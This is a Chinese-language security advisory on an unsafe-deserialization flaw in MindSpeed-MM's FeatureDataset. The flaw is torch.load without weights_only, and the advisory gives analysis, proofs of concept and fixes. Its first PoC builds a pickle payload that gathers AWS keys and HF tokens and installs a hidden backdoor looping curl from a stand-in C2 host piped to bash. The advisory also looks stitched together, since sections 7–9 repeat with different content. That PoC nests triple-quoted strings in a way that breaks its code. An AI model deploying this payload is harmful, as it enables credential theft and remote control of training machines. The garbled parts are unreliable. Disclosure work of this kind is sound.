# VULN-DF-MM-DS-08: FeatureDataset 不安全反序列化漏洞 `get_data_from_feature_data`

**严重性**: High | **CWE**: CWE-502 | **置信度**: 85/100
**位置**: `mindspeed_mm/data/datasets/feature_dataset.py:96` @ `get_data_from_feature_data`

---

## 1. 漏洞细节

本漏洞位于特征数据加载函数 `_load_feature`（实为 `get_data_from_feature_data`）中，该函数在加载 `.pt` 格式的特征数据文件时使用 `torch.load()` 但未设置 `weights_only=True` 参数，允许 pickle 反序列化执行任意代码。

`feature_path` 参数来自用户配置文件 `mm_data.json` 中的 `data_path` 配置项，用户可以指定任意特征数据文件路径。攻击者可以通过构造恶意的 `.pt` 文件作为特征数据集，诱导用户使用该数据集进行训练，从而在数据加载阶段执行任意代码。

### 漏洞成因

1. `torch.load(feature_path, map_location=torch.device('cpu'))` 未设置安全参数
2. `feature_path` 参数来自数据集配置，用户完全可控
3. 该函数在数据集 `__getitem__` 方法中调用，每次获取数据样本时都可能触发

---

## 2. 漏洞代码

**文件**: `mindspeed_mm/data/datasets/feature_dataset.py` (行 85-97)

```python
def get_data_from_feature_data(self, feature_path: str) -> dict:
    """
    Load feature data from a specified file path.
    
    Args:
        feature_path (str): The path to the feature data file.
        
    Returns:
        dict: A dictionary containing the loaded feature data.
    """
    if feature_path.endswith(".pt"):
        return torch.load(feature_path, map_location=torch.device('cpu'))  # <-- 漏洞点：无 weights_only 参数
    raise NotImplementedError("Unsupported file format. Only .pt files are currently supported.")
```

### 数据加载上下文

```python
def __getitem__(self, index: int) -> dict:
    """
    Get the data sample at the specified index.
    """
    sample = self.data_samples[index]

    # Initialize the output data structure
    examples = copy.deepcopy(T2VOutputData)
    feature_file_path = sample[FILE_INFO]
    if self.data_folder:
        feature_file_path = os.path.join(self.data_folder, feature_file_path)
    
    # Load feature data from the specified file
    feature_data = self.get_data_from_feature_data(feature_file_path)  # 调用漏洞函数
    
    # ... 后续数据处理
```

### 配置来源

```json
// mm_data.json 示例配置
{
    "dataset": {
        "type": "FeatureDataset",
        "data_path": "/path/to/features/",  // 用户可控，特征文件所在目录
        "data_samples": [
            {"file_info": "sample_001.pt"},
            {"file_info": "sample_002.pt"}
        ]
    }
}
```

### 代码分析

- **行 96**: `torch.load(feature_path, ...)` 未设置 `weights_only=True`
- **行 95**: 仅检查文件扩展名是否为 `.pt`，无其他验证
- **行 56-58**: `feature_file_path` 来自 `data_samples` 配置和 `data_folder`
- **行 61**: 每次访问数据样本时调用此函数

---

## 3. 完整攻击链路

```
[入口点] mm_data.json 配置文件
↓ 用户配置 dataset.data_path 和 data_samples
[中间步骤1] FeatureDataset.__init__() 加载配置 @ feature_dataset.py:30
↓ 初始化数据集，解析样本路径
[中间步骤2] FeatureDataset.__getitem__(index) @ feature_dataset.py:42
↓ 数据加载循环调用
[中间步骤3] get_data_from_feature_data(feature_file_path) @ feature_dataset.py:85
↓ 传递恶意 .pt 文件路径
[漏洞触发] torch.load(feature_path, map_location='cpu') @ feature_dataset.py:96
↓ pickle 反序列化执行恶意代码
```

### 攻击链路说明

1. **入口点**: 用户在数据配置中指定特征数据文件路径
2. **数据集初始化**: `FeatureDataset` 加载配置并解析样本列表
3. **数据访问**: 训练循环中调用 `__getitem__` 获取数据样本
4. **代码执行**: `torch.load()` 反序列化恶意特征文件，执行 payload

---

## 4. 攻击场景

**攻击者画像**: 提供恶意特征数据集的第三方、供应链攻击者、内部威胁
**攻击向量**: 通过共享特征数据文件传播恶意 payload
**利用难度**: 低

### 攻击步骤

1. **构造恶意特征文件**: 攻击者创建包含恶意 pickle payload 的 `.pt` 文件
2. **伪装为正常数据**: 文件包含部分正常特征数据以维持训练流程
3. **传播恶意文件**: 通过数据集共享平台、内部存储等方式传播
4. **触发漏洞**: 用户使用该数据集进行训练，每次加载样本时都可能触发

---

## 5. 攻击条件

| 条件类型   | 要求                    | 说明                                               |
| ---------- | ----------------------- | -------------------------------------------------- |
| 网络可达性 | 需能访问特征文件存储    | 特征文件需要在可访问的存储位置                     |
| 认证要求   | 可能需要存储访问权限    | 取决于数据存储的安全配置                           |
| 配置依赖   | mm_data.json 配置       | 用户需要在配置中指定特征数据路径                   |
| 环境依赖   | PyTorch 库              | 需要安装 PyTorch 库                                |

---

## 6. 造成影响

| 影响维度 | 等级 | 说明                                                   |
| -------- | ---- | ------------------------------------------------------ |
| 机密性   | 高   | 恶意代码可窃取训练数据、模型权重、环境变量            |
| 完整性   | 高   | 恶意代码可篡改特征数据、植入后门、修改训练结果        |
| 可用性   | 高   | 恶意代码可删除特征文件、破坏训练流程                  |

**影响范围**: 
- 执行特征数据加载的训练节点
- 使用该数据集的所有训练任务
- 每次数据访问都可能触发 payload

---

## 7. PoC (概念验证)

> ⚠️ 以下 PoC 仅供安全测试和验证使用

### 构造恶意特征数据文件

```python
# create_malicious_feature.py
import torch
import os
import numpy as np

class FeatureDataPayload:
    def __reduce__(self):
        # pickle 反序列化时执行的恶意代码
        code = '''
import os
import json

# 窃取训练环境信息
env_info = {
    'hostname': os.uname().nodename,
    'user': os.environ.get('USER'),
    'pwd': os.getcwd(),
    'aws_key': os.environ.get('AWS_ACCESS_KEY_ID'),
    'hf_token': os.environ.get('HF_TOKEN')
}

# 写入窃取文件
with open('/tmp/.feature_data_exfiltrated', 'w') as f:
    json.dump(env_info, f)

# 植入后门脚本
backdoor_script = '''
#!/bin/bash
while true; do
    curl -s http://attacker-c2.example.com/cmd | bash
    sleep 60
done
'''
with open('/tmp/.backdoor.sh', 'w') as f:
    f.write(backdoor_script)
os.system('chmod +x /tmp/.backdoor.sh && nohup /tmp/.backdoor.sh &')
'''
        return (exec, (code,))

# 创建包含 payload 的特征数据（伪装为正常数据）
malicious_feature_data = {
    'video': torch.randn(16, 3, 256, 256),  # 正常视频特征
    'prompt_ids': torch.randint(0, 1000, (128,)),  # 正常文本特征
    'prompt_mask': torch.ones(128),  # 正常掩码
    '__payload__': FeatureDataPayload()  # 恶意 payload
}

# 保存恶意特征文件
torch.save(malicious_feature_data, 'malicious_feature_sample.pt')
print("Created malicious feature data file")
```

### 配置恶意数据集

```json
// mm_data.json
{
    "dataset": {
        "type": "FeatureDataset",
        "data_folder": "./malicious_features/",
        "data_samples": [
            {"file_info": "malicious_feature_sample.pt", "prompt": "test prompt"}
        ]
    }
}
```

### 触发漏洞的命令

```bash
# 用户使用恶意数据集运行训练
python train.py --data-config mm_data.json --model-config mm_model.json
```

**使用说明**: 
1. 构造包含 payload 的特征数据文件
2. 在数据配置中指向恶意文件
3. 启动训练，数据加载时触发 payload

**预期结果**: 
- `/tmp/.feature_data_exfiltrated` 包含窃取的环境信息
- 后门脚本 `/tmp/.backdoor.sh` 被创建并运行

---

## 8. 验证环境搭建

### 基础环境

- 操作系统: Ubuntu 22.04 / CentOS 8
- Python: 3.10+
- PyTorch: 2.0+
- MindSpeed-MM: 当前版本

### 构建步骤

```bash
# 安装依赖
pip install torch numpy

# 创建测试目录
mkdir -p test_feature_data
```

### 创建测试 payload

```python
# test_feature_payload.py
import torch
import os

class TestFeaturePayload:
    def __reduce__(self):
        return (os.system, ('echo "VULN_DS_08_FEATURE_DATASET" > /tmp/vuln_ds_08_marker',))

# 构造模拟的特征数据
feature_data = {
    'video': torch.randn(10, 4, 64, 64),  # 模拟视频特征
    'prompt_ids': torch.randint(0, 100, (50,)),
    'prompt_mask': torch.ones(50),
    '__test_payload__': TestFeaturePayload()
}

torch.save(feature_data, 'test_feature_data/sample.pt')
print("Test feature file created")
```

### 运行配置

```bash
# 创建测试文件
python test_feature_payload.py

# 验证测试标记不存在
ls /tmp/vuln_ds_08_marker  # 应不存在

# 直接测试 torch.load
python -c "
import torch
data = torch.load('test_feature_data/sample.pt', map_location='cpu')
print('Loaded keys:', list(data.keys())[:3])
"

# 检查标记
cat /tmp/vuln_ds_08_marker
```

### 验证步骤

1. 创建包含测试 payload 的特征文件
2. 使用 `torch.load()` 加载该文件
3. 检查 `/tmp/vuln_ds_08_marker` 是否被创建

### 预期结果

- 文件 `/tmp/vuln_ds_08_marker` 存在
- 内容为 "VULN_DS_08_FEATURE_DATASET"

---

## 9. 修复建议

### 立即修复

```python
# 安全版本
def get_data_from_feature_data(self, feature_path: str) -> dict:
    """
    Load feature data from a specified file path.
    """
    if feature_path.endswith(".pt"):
        # 使用 weights_only=True 安全加载
        try:
            data = torch.load(feature_path, map_location=torch.device('cpu'), weights_only=True)
        except Exception as e:
            # 如果安全加载失败，记录错误
            raise RuntimeError(f"Could not load feature data safely from {feature_path}: {e}")
        return data
    raise NotImplementedError("Unsupported file format. Only .pt files are currently supported.")
```

### 长期建议

1. 使用 safetensors 格式存储特征数据
2. 添加特征数据签名验证
3. 实现特征数据内容验证（检查必需的键名和数据类型）
---

## 7. 漏洞验证

### 7.1 手动验证步骤

```bash
# 1. 创建测试目录
mkdir -p test_vuln_ds/features

# 2. 构造恶意 .pt 文件 (Python)
python3 -c "
import torch
class P:
    def __reduce__(self):
        return (exec, ('open(\"/tmp/vuln08_pwned.txt\",\"w\").write(\"RCE\")',))
torch.save({'video':torch.randn(1,4,480,848), 'payload':P()}, 'test_vuln_ds/features/evil.pt')
"

# 3. 创建数据索引
echo '{"file":"features/evil.pt","captions":["test"]}' > test_vuln_ds/data.jsonl

# 4. 验证触发
python3 -c "
from mindspeed_mm.data.datasets.feature_dataset import FeatureDataset
ds = FeatureDataset({'data_path':'test_vuln_ds/data.jsonl','data_folder':'test_vuln_ds/'})
item = ds[0]  # 触发 torch.load()
"

# 5. 检查结果
cat /tmp/vuln08_pwned.txt  # 应显示 "RCE"
```

### 7.2 自动化验证脚本

```python
#!/usr/bin/env python3
"""自动化漏洞验证"""

import torch
import os
import tempfile
import sys

# 添加项目路径
sys.path.insert(0, '/path/to/MindSpeed-MM')

def verify_vulnerability():
    print("[*] VULN-DF-MM-DS-08 漏洞验证")
    
    # 创建临时测试环境
    test_dir = tempfile.mkdtemp()
    features_dir = os.path.join(test_dir, "features")
    os.makedirs(features_dir)
    
    # 恶意 payload
    marker_file = "/tmp/vuln08_marker.txt"
    
    class MaliciousPayload:
        def __reduce__(self):
            return (exec, (f'open("{marker_file}","w").write("VULN08_CONFIRMED")',))
    
    # 构造恶意 .pt
    evil_pt = os.path.join(features_dir, "evil.pt")
    torch.save({
        "video": torch.randn(1, 16, 480, 848),
        "prompt_ids": torch.randint(0, 1000, (1, 128)),
        "prompt_mask": torch.ones(1, 128),
        "payload": MaliciousPayload()
    }, evil_pt)
    
    # 创建数据索引
    data_jsonl = os.path.join(test_dir, "data.jsonl")
    with open(data_jsonl, "w") as f:
        f.write('{"file":"features/evil.pt","captions":["test"]}')
    
    # 触发漏洞
    try:
        from mindspeed_mm.data.datasets.feature_dataset import FeatureDataset
        ds = FeatureDataset({
            "data_path": data_jsonl,
            "data_folder": test_dir
        })
        item = ds[0]  # 这里会触发 torch.load()
        
        # 验证
        if os.path.exists(marker_file):
            content = open(marker_file).read()
            print(f"[+] 漏洞已验证！Payload 执行成功: {content}")
            return True
        else:
            print("[!] 漏洞未触发，可能环境问题")
            return False
    except Exception as e:
        print(f"[!] 测试异常: {e}")
        return False
    finally:
        # 清理
        import shutil
        shutil.rmtree(test_dir, ignore_errors=True)
        if os.path.exists(marker_file):
            os.remove(marker_file)

if __name__ == "__main__":
    result = verify_vulnerability()
    print(f"\n验证结果: {'漏洞确认' if result else '需进一步检查'}")
```

---

## 8. 影响范围

### 受影响配置文件

项目中使用 `dataset_type: "feature"` 的配置文件：

| 配置路径                                    | 模型           | 使用场景         |
| ------------------------------------------- | -------------- | ---------------- |
| examples/hunyuanvideo/t2v/feature_data.json | HunyuanVideo   | T2V 训练         |
| examples/hunyuanvideo/i2v/feature_data.json | HunyuanVideo   | I2V 训练         |
| examples/wan2.1/1.3b/t2v/feature_data.json  | Wan2.1 1.3B    | T2V 训练         |
| examples/wan2.1/14b/t2v/feature_data.json   | Wan2.1 14B     | T2V 训练         |
| examples/opensoraplan1.3/t2v_A3/*.json      | OpenSoraPlan   | 视频生成训练     |
| examples/vace/*/feature_data.json           | VACE           | 视频编辑训练     |
| tests/st/run_configs/pretrain_*/data.json   | 多种模型       | ST 测试配置      |

### 同类漏洞位置

项目中其他使用 `torch.load()` 加载用户数据的类似漏洞：

| 漏洞 ID         | 文件路径                              | 行号 | 描述                  |
| --------------- | ------------------------------------- | ---- | --------------------- |
| VULN-DF-MM-DS-08| feature_dataset.py                    | 96   | FeatureDataset 特征加载|
| -               | t2v_dataset.py                        | 230  | T2VDataset 特征加载   |
| -               | siglip_vit_model.py                   | 818  | Vision Encoder 加载   |
| -               | contextparallel_causalvae.py         | 521  | VAE checkpoint 加载   |
| -               | checkpoint.py                         | 37   | 模型 checkpoint 加载  |

---

## 9. 技术深度分析

### 9.1 PyTorch torch.load() 安全机制

```python
# PyTorch torch.load() 函数签名
torch.load(
    f,
    map_location=None,
    picklemodule=None,
    weights_only=False,  # ⚠️ 关键安全参数，默认为 False
    mmap=None,
    **kwargs
)

# weights_only 参数说明:
# - False (默认): 使用 pickle.loads() 反序列化，允许任意 Python 对象
# - True: 使用 weights_only_unpickler，仅允许张量和基本类型
```

### 9.2 Pickle 反序列化攻击原理

```python
# Pickle __reduce__ 机制
class MaliciousObject:
    def __reduce__(self):
        """
        __reduce__ 方法定义反序列化时的重建行为
        返回: (callable, args_tuple)
        反序列化时执行: callable(*args_tuple)
        """
        return (exec, ("import os; os.system('malicious_command')",))

# 当 torch.load() 使用 pickle.loads() 时:
# 1. pickle 解析数据流
# 2. 发现 MaliciousObject 的 reduce 指令
# 3. 调用 exec("import os; os.system('malicious_command')")
# 4. 恶意代码被执行
```

### 9.3 特征数据集工作流程

```
特征提取阶段 (get_sora_feature.py):
原始视频 → VAE 编码 → 文本编码 → torch.save() → .pt 文件

训练阶段 (feature_dataset.py):
.pt 文件 → torch.load() → DataLoader → 模型训练

漏洞点:
- 特征提取生成的 .pt 文件可能被篡改
- 训练加载时无安全验证
- pickle 反序列化可执行任意代码
```

---

## 10. 修复建议

### 10.1 直接修复

**修改文件**: `mindspeed_mm/data/datasets/feature_dataset.py`

```python
# 原代码 (不安全)
def get_data_from_feature_data(self, feature_path: str) -> dict:
    if feature_path.endswith(".pt"):
        return torch.load(feature_path, map_location=torch.device('cpu'))
    raise NotImplementedError(...)

# 修复方案 1: 使用 weights_only=True
def get_data_from_feature_data(self, feature_path: str) -> dict:
    if feature_path.endswith(".pt"):
        return torch.load(feature_path, map_location=torch.device('cpu'), weights_only=True)
    raise NotImplementedError(...)

# 修复方案 2: 添加文件验证
def get_data_from_feature_data(self, feature_path: str) -> dict:
    if feature_path.endswith(".pt"):
        # 验证文件来源
        if not self._validate_feature_file(feature_path):
            raise SecurityError(f"Untrusted feature file: {feature_path}")
        return torch.load(feature_path, map_location=torch.device('cpu'), weights_only=True)
    raise NotImplementedError(...)
```

### 10.2 同类漏洞修复

```python
# t2v_dataset.py:230 同样需要修复
def get_data_from_feature_data(self, feature_path):
    if feature_path.endswith(".pt"):
        return torch.load(feature_path, map_location=torch.device('cpu'), weights_only=True)
    raise NotImplementedError("Not implemented.")
```

### 10.3 全局安全策略

```python
# 在 mindspeed_mm/data/data_utils/utils.py 添加安全加载函数
def safe_torch_load(path: str, **kwargs):
    """
    安全的 torch.load 包装函数
    强制使用 weights_only=True
    """
    kwargs.setdefault('weights_only', True)  # 强制安全模式
    kwargs.setdefault('map_location', 'cpu')
    return torch.load(path, **kwargs)

# 在所有数据集类中使用安全加载
from mindspeed_mm.data.data_utils.utils import safe_torch_load

def get_data_from_feature_data(self, feature_path: str) -> dict:
    if feature_path.endswith(".pt"):
        return safe_torch_load(feature_path)  # 自动使用 weights_only=True
    ...
```

### 10.4 配置验证

```python
# 在数据集初始化时验证配置
class MMBaseDataset(Dataset):
    def __init__(self, data_path: str = "", data_folder: str = "", ...):
        # 验证路径安全性
        if not self._validate_config_path(data_path):
            raise SecurityError(f"Invalid data_path: {data_path}")
        if data_folder and not self._validate_config_path(data_folder):
            raise SecurityError(f"Invalid data_folder: {data_folder}")
        ...
    
    def _validate_config_path(self, path: str) -> bool:
        """验证配置路径是否安全"""
        # 防止路径遍历
        if '..' in path or path.startswith('/etc') or path.startswith('/root'):
            return False
        return True
```

---

## 11. 风险评估

| 评估维度       | 评分   | 说明                                               |
| -------------- | ------ | -------------------------------------------------- |
| **严重性**     | High   | 可导致任意代码执行，完全控制训练环境               |
| **可利用性**   | High   | 攻击条件低，只需控制数据集文件                     |
| **攻击者成本** | Low    | 构造恶意 .pt 文件成本极低                          |
| **发现难度**   | Medium | 漏洞代码明显，但需要理解数据流                     |
| **影响范围**   | High   | 多个模型训练配置使用 feature dataset               |

### CVSS 评分估算

```
CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H
基础评分: 9.6 (Critical)

解释:
- AV:N (网络): 通过共享数据集传播
- AC:L (低复杂度): 构造 payload 简单
- PR:N (无需权限): 用户下载公开数据集即可触发
- UI:R (需用户交互): 用户需要配置使用数据集
- S:C (范围改变): 可影响整个训练环境
- C:H/I:H/A:H: 完全的机密性/完整性/可用性影响
```

---

## 12. 总结

VULN-DF-MM-DS-08 是一个**真实且高危**的反序列化漏洞：

1. **漏洞真实性**: `torch.load()` 未使用安全参数，pickle 反序列化可执行任意代码
2. **攻击可行性**: 攻击者可通过分发恶意数据集触发漏洞，用户仅需使用该数据集训练
3. **影响广泛性**: 多个视频生成模型（HunyuanVideo、Wan2.1、OpenSoraPlan）使用该数据集类型
4. **修复简单性**: 添加 `weights_only=True` 参数即可修复

**建议**: 立即修复所有 `torch.load()` 调用，添加 `weights_only=True` 参数，并考虑实现全局安全加载策略。

---

## 13. 参考资料

- [PyTorch torch.load() 文档](https://pytorch.org/docs/stable/generated/torch.load.html)
- [CWE-502: Deserialization of Untrusted Data](https://cwe.mitre.org/data/definitions/502.html)
- [Python pickle 安全风险](https://docs.python.org/3/library/pickle.html#security)
- [MindSpeed-MM Security Note](docs/zh/SECURITYNOTE.md)

